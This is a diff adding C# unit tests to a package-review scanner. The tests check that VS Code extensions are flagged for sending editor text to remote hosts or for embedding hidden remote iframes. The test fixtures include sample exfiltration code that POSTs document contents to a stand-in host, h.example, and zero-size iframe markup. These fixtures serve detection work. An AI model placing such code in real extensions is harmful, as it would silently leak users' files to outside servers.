@@ -1383,6 +1383,44 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void A_vscode_extension_posting_document_text_over_http_or_holding_a_hidden_remote_iframe_is_noteworthy()
+    {
+        var pkg = """{"name":"assist","publisher":"acme","version":"1.0.0","main":"./dist/extension.js"}""";
+        var send = "const d=e.document;(0,l.default)('http://h.example/upload',{method:'POST',headers:{a:1},body:JSON.stringify({t:d.getText()})});";
+        var r = Review(Zip("acme.assist-1.0.0.vsix", ("extension/package.json", U(pkg)), ("extension/dist/extension.js", U(send)),
+            ("extension/media/main.html", U("<body><iframe src='http://h.example' width=0 height=0></iframe></body>"))));
+        Assert.Equal("noteworthy", r.Review);
+        Assert.Contains(r.Findings, f => f is { Rule: "package/editor-content-send", Level: "noteworthy", Path: "extension/dist/extension.js" });
+        Assert.Contains(r.Findings, f => f is { Rule: "package/hidden-frame", Level: "noteworthy", Path: "extension/media/main.html" });
+        var https = Review(Zip("acme.assist-1.0.1.vsix", ("extension/package.json", U(pkg)), ("extension/dist/extension.js", U(send.Replace("http:", "https:", StringComparison.Ordinal)))));
+        Assert.Contains(https.Findings, f => f is { Rule: "package/editor-content-send", Level: "review" });
+        var client = Review(Zip("acme.assist-1.0.3.vsix", ("extension/package.json", U(pkg)),
+            ("extension/dist/extension.js", U("axios.post('http://h.example/x',{t:d.getText()});const html=`<iframe src=\"http://h.example\" width=\"0\" height=\"0\">`;"))));
+        Assert.Contains(client.Findings, f => f is { Rule: "package/editor-content-send", Level: "noteworthy" });
+        Assert.Contains(client.Findings, f => f is { Rule: "package/hidden-frame", Path: "extension/dist/extension.js" });
+    }
+
+    [Fact]
+    public void A_scoped_iframe_rule_or_a_property_ending_in_width_does_not_hide_a_remote_iframe()
+    {
+        var pkg = """{"name":"assist","publisher":"acme","version":"1.0.0","main":"./dist/extension.js"}""";
+        var page = "<style>@media print{iframe{display:none}} .collapsed iframe{display:none}</style>"
+                   + "<iframe src='https://h.example/embed' style='border-width:0;min-width:0;max-height:0'></iframe>";
+        var r = Review(Zip("acme.assist-1.0.4.vsix", ("extension/package.json", U(pkg)), ("extension/media/main.html", U(page))));
+        Assert.DoesNotContain(r.Findings, f => f.Rule == "package/hidden-frame");
+    }
+
+    [Fact]
+    public void A_vscode_extension_posting_document_text_to_localhost_or_showing_a_visible_iframe_has_no_finding()
+    {
+        var pkg = """{"name":"assist","publisher":"acme","version":"1.0.0","main":"./dist/extension.js"}""";
+        var r = Review(Zip("acme.assist-1.0.2.vsix", ("extension/package.json", U(pkg)),
+            ("extension/dist/extension.js", U("const t=doc.getText();fetch('http://127.0.0.1:8080/fmt',{method:'POST',body:t});")),
+            ("extension/media/main.html", U("<style>iframe{width:100%}</style><iframe src='https://h.example/docs'></iframe>"))));
+        Assert.DoesNotContain(r.Findings, f => f.Rule is "package/editor-content-send" or "package/hidden-frame");
+    }
+
+    [Fact]
     public void The_package_view_names_the_review_in_the_overview()
     {
         var path = Tgz("internal-auth-1.0.0.tgz",
